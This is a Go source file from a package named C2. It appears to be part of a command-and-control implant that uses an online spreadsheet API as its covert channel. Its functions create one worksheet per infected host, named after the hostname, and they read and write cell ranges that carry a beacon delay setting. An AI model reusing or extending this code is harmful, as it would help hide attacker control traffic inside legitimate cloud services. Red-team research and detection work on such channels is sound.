package C2

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"strconv"
	"time"
)

type WorkSheet struct {
	Id         string `json:"id"`
	Position   int    `json:"position"`
	Name       string `json:"name"`
	Visibility string `json:"visibility"`
}

type WorkSheets struct {
	Value []WorkSheet `json:"value"`
}

type CellRange struct {
	Address       string  `json:"address"`
	AddressLocal  string  `json:"addressLocal-value"`
	CellCount     int     `json:"cellCount"`
	ColumnCount   int     `json:"columnCount"`
	ColumnHidden  bool    `json:"columnHidden"`
	ColumnIndex   int     `json:"columnIndex"`
	Formulas      []any   `json:"formulas"`
	FormulasLocal []any   `json:"formulasLocal"`
	FormulasR1C1  []any   `json:"formulasR1C1"`
	Hidden        bool    `json:"hidden"`
	NumberFormat  []any   `json:"numberFormat"`
	RowCount      int     `json:"rowCount"`
	RowHidden     bool    `json:"rowHidden"`
	RowIndex      int     `json:"rowIndex"`
	Text          []any   `json:"text"`
	ValueTypes    []any   `json:"valueTypes"`
	Values        [][]any `json:"values"`
}

type Ok struct {
	Ok bool `json:"ok"`
}

func (c *Client) GenerateNewSheetName() string {

	currentTime := time.Now()
	currentTimeS := currentTime.Format("02-01-2006")
	unixString := strconv.FormatInt(currentTime.Unix(), 10)
	hostname, err := os.Hostname()
	if err != nil {
		return currentTimeS + "_" + unixString[len(unixString)-5:]
	}
	return currentTimeS + "_" + hostname
}

func (c *Client) AddSheet(name string) {

	// Check if the worksheet exists
	if !c.DoesWorksheetExist(name) {

		// Create the worksheet
		body := new(WorkSheet)
		body.Name = name
		json_body, _ := json.Marshal(body)
		req, err := c.newRequest("POST", "/add", bytes.NewBuffer(json_body), "")
		if err != nil {
			log.Fatal(err)
		}

		ws := new(WorkSheet)
		_, err = c.do(req, &ws)
		if err != nil {
			log.Fatal("Failed to create worksheet: ", err)
		}

		// Add the ticker
		trange := "C1:" + c.TickerCell
		ticker_data := [][]string{{"Delay config (sec):", strconv.Itoa(c.Ticker)}}
		_, err = c.UpdateRange(trange, ticker_data)
		if err != nil {
			fmt.Println("Cell change error ", err)
		}
	}

}

func (c *Client) UpdateRange(cells string, values_string [][]string) (*CellRange, error) {

	body := map[string][][]string{
		"values": values_string,
	}
	json_body, _ := json.Marshal(body)
	req, err := c.newRequest("PATCH", `/`+c.SheetName+`/range(address='`+cells+`')`, bytes.NewBuffer(json_body), "")
	if err != nil {
		log.Fatal(err)
	}

	cr := new(CellRange)
	_, err = c.do(req, &cr)
	if err != nil {
		return nil, err
	}
	return cr, err
}

func (c *Client) GetRangeValues(cells string) (*CellRange, error) {

	req, err := c.newRequest("GET", `/`+c.SheetName+`/range(address='`+cells+`')`, nil, "")
	if err != nil {
		log.Fatal(err)
	}

	cr := new(CellRange)
	_, err = c.do(req, &cr)
	if err != nil {
		return nil, err
	}
	return cr, err
}
func (c *Client) GetWorksheets() (*WorkSheets, error) {
	req, err := c.newRequest("GET", "/", nil, "")
	if err != nil {
		log.Fatal(err)
	}

	wsa := new(WorkSheets)
	_, err = c.do(req, &wsa)
	if err != nil {
		return nil, err
	}
	return wsa, err
}

func (c *Client) DoesWorksheetExist(ws_name string) bool {
	wsas, err := c.GetWorksheets()
	if err != nil {
		log.Fatal(err)
	}
	exists := false

	for _, v := range wsas.Value {
		if v.Name == ws_name {
			exists = true
		}
	}

	return exists
}
